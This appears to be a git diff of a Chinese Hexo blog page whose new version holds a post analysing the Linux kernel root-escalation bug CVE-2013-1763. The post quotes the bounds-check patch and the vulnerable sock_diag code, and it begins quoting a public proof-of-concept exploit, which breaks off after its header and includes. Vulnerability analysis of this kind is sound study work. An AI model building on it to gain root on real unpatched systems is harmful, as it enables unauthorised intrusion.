@@ -1,541 +1,2277 @@
 <!DOCTYPE html>
-<html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
 <head>
-  <meta charset="utf-8">
-  <title>Frank&#39;s Blog</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="Frank&#39;s Blog">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析kernel 最近出了一个新的本地提权安全漏洞CVE-2013-1763，影响范围比较广泛，ubuntu，Arch，fedora都受到其影响，漏洞刚公布就有牛人发布了利用该漏洞获取root权限的攻击代码，下面会分析该代码是如何获取">
-<meta name="keywords" content="linux CVE-2013-1763 漏洞">
-<meta property="og:type" content="article">
-<meta property="og:title" content="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析">
-<meta property="og:url" content="https://fengguoqing.github.io/2016/09/04/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/index.html">
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Frank's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="Frank&#39;s Blog">
+<meta property="og:url" content="https://fengguoqing.github.io/index.html">
 <meta property="og:site_name" content="Frank&#39;s Blog">
-<meta property="og:description" content="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析kernel 最近出了一个新的本地提权安全漏洞CVE-2013-1763，影响范围比较广泛，ubuntu，Arch，fedora都受到其影响，漏洞刚公布就有牛人发布了利用该漏洞获取root权限的攻击代码，下面会分析该代码是如何获取root权限的。 首先对CVE-2013-1763这个安全漏洞简单介绍一下。 1">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-26T01:53:26.167Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析">
-<meta name="twitter:description" content="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析kernel 最近出了一个新的本地提权安全漏洞CVE-2013-1763，影响范围比较广泛，ubuntu，Arch，fedora都受到其影响，漏洞刚公布就有牛人发布了利用该漏洞获取root权限的攻击代码，下面会分析该代码是如何获取root权限的。 首先对CVE-2013-1763这个安全漏洞简单介绍一下。 1">
+<meta name="twitter:title" content="Frank&#39;s Blog">
 
 
-<link rel="icon" href="/img/avatar.jpg">
 
-<link rel="stylesheet" href="/css/style.css">
-
-<link rel="stylesheet" href="/css/hl_theme/atom-dark.css">
-
-<link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet">
-<link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
-<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-<script src="/js/jquery.autocomplete.min.js"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js"></script>
-<script>
-    hljs.initHighlightingOnLoad();
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
 </script>
 
-<script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+  <link rel="canonical" href="https://fengguoqing.github.io/"/>
+
+
+
+
+
+  <title>Frank's Blog</title>
+  
+
+
+
+
+
+
 
 
 </head>
-<div style="display: none">
-  <input class="theme_disqus_on" value="false">
-  <input class="theme_preload_comment" value="true">
-</div>
-<body>
-<aside class="nav mobile">
-    <div class="nav-left">
-        <a href="/" class="avatar_target">
-    <img class="avatar" src="/img/avatar.jpg" />
-</a>
-<div class="author">
-    <span>Frank Feng</span>
-</div>
-<div class="icon">
-    
-    <a class="rss" title="rss" href="/atom.xml" target="_blank"></a>
-    
-    
-    <a class="github" title="github" href="https://github.com/fengguoqing" target="_blank"></a>
-    
-    
-    
-    
-    
-    
-    
-    <a class="weibo" title="weibo" href="https://weibo.com/1786812385" target="_blank"></a>
-    
-    
-    <a class="email" title="email" href="mailto:fengguoqing611@gmail.com"></a>
-    
-</div>
-<ul>
-    <li class="all active">全部文章</li>
-    
-    <li data-rel="安全"> 安全 </li>
-    
-    <li data-rel="其他"> 其他 </li>
-    
-    <li data-rel="电源管理"> 电源管理 </li>
-    
-</ul>
-<div class="left-bottom">
-    <a class="about" href="/about">关于</a><a class="friends">友链</a>
-</div>
-<input type="hidden" id="yelog_site_posts_number" value="16">
 
-<div style="display: none">
-    <span id="busuanzi_value_site_uv"></span>
-    <span id="busuanzi_value_site_pv"></span>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Frank's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
 </div>
-    </div>
-    <div class="nav-right">
-        <div class="friends-area">
-    <div class="friends-title">
-        友情链接
-        <i class="back-title-list"></i>
-    </div>
-    <div class="friends-content">
-        <ul>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
             
-            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-        </ul>
-    </div>
-</div>
-        <div class="title-list">
-    <form onkeydown="if(event.keyCode==13){return false;}">
-        <input class="search" type="text" placeholder="Search..." autocomplete="off">
-        <i class="cross"></i>
-        <span>
-        <label for="tagswitch">Tags:</label>
-        <input id="tagswitch" type="checkbox">
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fengguoqing.github.io/2016/09/04/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Frank Feng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
     </span>
-    </form>
-    <div class="tags-list">
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color3">功耗</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color3">linux移植</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">日常记录</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color3">教程</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color3">linux CVE-2013-1763 漏洞</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color3">redmine</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">系统安全</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">Linux内核调试</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">ACPI</a>
-    </li>
-    
-    <div class="clearfix"></div>
-</div>
 
-    <nav>
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Frank's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-        <a  class="电源管理 "
-           href="/2013/01/12/ACPI-DEBUG方法/"
-           data-tag="功耗,ACPI"
-           data-author="" >
-            <span class="post-title" title="ACPI DEBUG方法">ACPI DEBUG方法</span>
-            <span class="post-date" title="2013-01-12 23:56:24">2013/01/12</span>
-        </a>
         
-        <a  class="电源管理 "
-           href="/2013/01/10/ACPI规范阅读笔记/"
-           data-tag="功耗,ACPI"
-           data-author="" >
-            <span class="post-title" title="ACPI规范阅读笔记">ACPI规范阅读笔记</span>
-            <span class="post-date" title="2013-01-10 22:09:58">2013/01/10</span>
-        </a>
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2016/09/04/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/" itemprop="url">linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析</a></h1>
         
-        <a  class=""
-           href="/2014/04/14/Linux-kernel-make-menuconfig-时出错处理方法/"
-           data-tag="linux移植"
-           data-author="" >
-            <span class="post-title" title="Linux kernel make menuconfig 时出错处理方法">Linux kernel make menuconfig 时出错处理方法</span>
-            <span class="post-date" title="2014-04-14 17:53:42">2014/04/14</span>
-        </a>
-        
-        <a  class=""
-           href="/2013/11/07/Ubuntu默认启动到文本界面/"
-           data-tag="日常记录"
-           data-author="" >
-            <span class="post-title" title="Ubuntu默认启动到文本界面">Ubuntu默认启动到文本界面</span>
-            <span class="post-date" title="2013-11-07 10:50:18">2013/11/07</span>
-        </a>
-        
-        <a  class=""
-           href="/2013/01/13/how-to-install-PostgreSQL-on-ubuntu/"
-           data-tag="教程"
-           data-author="" >
-            <span class="post-title" title="how to install PostgreSQL on ubuntu">how to install PostgreSQL on ubuntu</span>
-            <span class="post-date" title="2013-01-13 00:29:56">2013/01/13</span>
-        </a>
-        
-        <a  class="安全 "
-           href="/2016/09/04/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/"
-           data-tag="linux CVE-2013-1763 漏洞"
-           data-author="" >
-            <span class="post-title" title="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析">linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析</span>
-            <span class="post-date" title="2016-09-04 20:52:20">2016/09/04</span>
-        </a>
-        
-        <a  class=""
-           href="/2013/01/12/mini2440基于uboot的TFTP下载教程/"
-           data-tag="教程"
-           data-author="" >
-            <span class="post-title" title="mini2440基于uboot的TFTP下载教程">mini2440基于uboot的TFTP下载教程</span>
-            <span class="post-date" title="2013-01-12 00:04:34">2013/01/12</span>
-        </a>
-        
-        <a  class="其他 "
-           href="/2014/04/20/在ubuntu上安装redmine/"
-           data-tag="redmine"
-           data-author="" >
-            <span class="post-title" title="在ubuntu上安装redmine">在ubuntu上安装redmine</span>
-            <span class="post-date" title="2014-04-20 16:33:52">2014/04/20</span>
-        </a>
-        
-        <a  class=""
-           href="/2013/11/02/基于linux-3-10的yaffs2移植/"
-           data-tag="linux移植"
-           data-author="" >
-            <span class="post-title" title="基于linux 3.10的yaffs2移植">基于linux 3.10的yaffs2移植</span>
-            <span class="post-date" title="2013-11-02 13:07:41">2013/11/02</span>
-        </a>
-        
-        <a  class=""
-           href="/2013/08/29/如何架设Git服务器/"
-           data-tag="教程"
-           data-author="" >
-            <span class="post-title" title="如何架设Git服务器">如何架设Git服务器</span>
-            <span class="post-date" title="2013-08-29 10:49:10">2013/08/29</span>
-        </a>
-        
-        <a  class=""
-           href="/2013/06/22/建立网站的一般步骤/"
-           data-tag="教程"
-           data-author="" >
-            <span class="post-title" title="建立网站的一般步骤">建立网站的一般步骤</span>
-            <span class="post-date" title="2013-06-22 20:22:22">2013/06/22</span>
-        </a>
-        
-        <a  class=""
-           href="/2014/01/19/某些TP-Link路由器可以被远程获取密码/"
-           data-tag="系统安全"
-           data-author="" >
-            <span class="post-title" title="某些TP-Link路由器可以被远程获取密码">某些TP-Link路由器可以被远程获取密码</span>
-            <span class="post-date" title="2014-01-19 17:59:38">2014/01/19</span>
-        </a>
-        
-        <a  class=""
-           href="/2013/12/02/生成和打上patch的方法/"
-           data-tag="教程"
-           data-author="" >
-            <span class="post-title" title="生成和打上patch的方法">生成和打上patch的方法</span>
-            <span class="post-date" title="2013-12-02 13:24:16">2013/12/02</span>
-        </a>
-        
-        <a  class=""
-           href="/2013/02/08/笔记本使用手机流量上网/"
-           data-tag="教程"
-           data-author="" >
-            <span class="post-title" title="笔记本使用手机流量上网">笔记本使用手机流量上网</span>
-            <span class="post-date" title="2013-02-08 23:22:49">2013/02/08</span>
-        </a>
-        
-        <a  class=""
-           href="/2014/02/15/解决三星手机WIFI“此网络不可用。证书已到期”方法/"
-           data-tag="日常记录"
-           data-author="" >
-            <span class="post-title" title="解决三星手机WIFI“此网络不可用。证书已到期”方法">解决三星手机WIFI“此网络不可用。证书已到期”方法</span>
-            <span class="post-date" title="2014-02-15 18:11:22">2014/02/15</span>
-        </a>
-        
-        <a  class=""
-           href="/2013/03/12/Linux内核调试方法总结/"
-           data-tag="Linux内核调试"
-           data-author="" >
-            <span class="post-title" title="Linux内核调试方法总结">Linux内核调试方法总结</span>
-            <span class="post-date" title="2013-03-12 16:25:59">2013/03/12</span>
-        </a>
-        
-    </nav>
-</div>
-    </div>
-    <div class="hide-list">
-        <div class="semicircle">
-            <div class="brackets first"><</div>
-            <div class="brackets">&gt;</div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-09-04T20:52:20+08:00">
+                2016-09-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
         </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析"><a href="#linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析" class="headerlink" title="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析"></a>linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析</h1><p>kernel 最近出了一个新的本地提权安全漏洞CVE-2013-1763，影响范围比较广泛，ubuntu，Arch，fedora都受到其影响，漏洞刚公布就有牛人发布了利用该漏洞获取root权限的攻击代码，下面会分析该代码是如何获取root权限的。</p>
+<p>首先对CVE-2013-1763这个安全漏洞简单介绍一下。</p>
+<h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>在<code>net/core/sock_diag.c</code>中，<code>__sock_diag_rcv_msg</code>函数未对<code>sock_diag_handlers</code>数组传入的下标做边界检查，导致可能越界，进而导致可执行代码的漏洞。没有root权限的用户可以利用该漏洞获取到root权限。</p>
+<h2 id="2-漏洞的影响范围"><a href="#2-漏洞的影响范围" class="headerlink" title="2. 漏洞的影响范围"></a>2. 漏洞的影响范围</h2><p><strong>linux kernel 3.0-3.7.10</strong></p>
+<h2 id="3-漏洞曝光时间"><a href="#3-漏洞曝光时间" class="headerlink" title="3. 漏洞曝光时间"></a>3. 漏洞曝光时间</h2><p><strong>2013/02/19</strong></p>
+<h2 id="4-漏洞产生的原因"><a href="#4-漏洞产生的原因" class="headerlink" title="4. 漏洞产生的原因"></a>4. 漏洞产生的原因</h2><p>首先看一下这个漏洞的patch：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">net/core/sock_diag.c View file @ <span class="number">6e601</span>a5</span><br><span class="line">@@ <span class="number">-121</span>,<span class="number">6</span> +<span class="number">121</span>,<span class="number">9</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)</span><br><span class="line">   <span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(*req))</span><br><span class="line">     <span class="keyword">return</span> -EINVAL;</span><br><span class="line"> </span><br><span class="line">+  <span class="keyword">if</span> (req-&gt;sdiag_family &gt;= AF_MAX)</span><br><span class="line">+    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">+</span><br><span class="line">   hndl = sock_diag_lock_handler(req-&gt;sdiag_family);</span><br><span class="line">   <span class="keyword">if</span> (hndl == <span class="literal">NULL</span>)</span><br><span class="line">     err = -ENOENT;</span><br></pre></td></tr></table></figure></p>
+<p>Patch 很简单，只是加上了数组边界判断而已。那么在看看<code>sock_diag_lock_hander</code>这个函数做了些什么：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">inline</span> struct sock_diag_handler *<span class="title">sock_diag_lock_handler</span><span class="params">(<span class="keyword">int</span> family)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sock_diag_handlers[family] == <span class="literal">NULL</span>)</span><br><span class="line">                request_module(<span class="string">"net-pf-%d-proto-%d-type-%d"</span>, PF_NETLINK,</span><br><span class="line">                                NETLINK_SOCK_DIAG, family);</span><br><span class="line"></span><br><span class="line">        mutex_lock(&amp;sock_diag_table_mutex);</span><br><span class="line">        <span class="keyword">return</span> sock_diag_handlers[family];<span class="comment">//这个函数没有对传入的family的值的范围,进行验证,从而造成数组越界.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这个函数也没有做什么，只是对 <code>sock_diag_lock_hander[family]</code>进行检测，是否为NULL，如果为NULL申请注册，然后加上了一把锁，最后返回的是它的地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_handler</span> *<span class="title">sock_diag_handlers</span>[<span class="title">AF_MAX</span>];</span>  <span class="comment">//可以看出,这个指针数组最大为AF_MAX AF_MAX = 40.</span></span><br></pre></td></tr></table></figure>
+<p>接着我们再看看完整的<code>__sock_diag_rcv_msg</code>函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_req</span> *<span class="title">req</span> = <span class="title">NLMSG_DATA</span>(<span class="title">nlh</span>);</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_handler</span> *<span class="title">hndl</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(*req))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    hndl = sock_diag_lock_handler(req-&gt;sdiag_family);<span class="comment">//这里传入sdiag_family的值,然后返回数组指针sock_diag_handlers[reg-&gt;sdiag_family].由于没有做边界判断，那么就可以越界。</span></span><br><span class="line">    <span class="keyword">if</span> (hndl == <span class="literal">NULL</span>)</span><br><span class="line">        err = -ENOENT;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = hndl-&gt;dump(skb, nlh); <span class="comment">//看到这里是不是很激动呢，利用这里可以让它执行我们自己的代码</span></span><br><span class="line">    sock_diag_unlock_handler(hndl);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="5-漏洞的利用"><a href="#5-漏洞的利用" class="headerlink" title="5. 漏洞的利用"></a>5. 漏洞的利用</h2><p>虽然已经找到了kernel中有这样一个漏洞，但是如何利用这个漏洞来执行我们自己的程序，取得root权限还是需要很困难的，需要对kernel系统以及计算机运行原理非常了解才可以，并且这些程序往往需要精细设计才能达到最终的目的。 下面是某牛人写的exploit代码，请欣赏：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* quick'n'dirty poc for CVE-2013-1763 SOCK_DIAG bug in kernel 3.3-3.8</span></span><br><span class="line"><span class="comment">* bug found by Spender</span></span><br><span class="line"><span class="comment">* poc by SynQ</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* hard-coded for 3.5.0-17-generic #28-Ubuntu SMP Tue Oct 9 19:32:08 UTC 2012 i686 i686 i686 GNU/Linux</span></span><br><span class="line"><span class="comment">* using nl_table-&gt;hash.rehash_time, index 81</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* Fedora 18 support added</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* 2/2013</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sock_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/inet_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 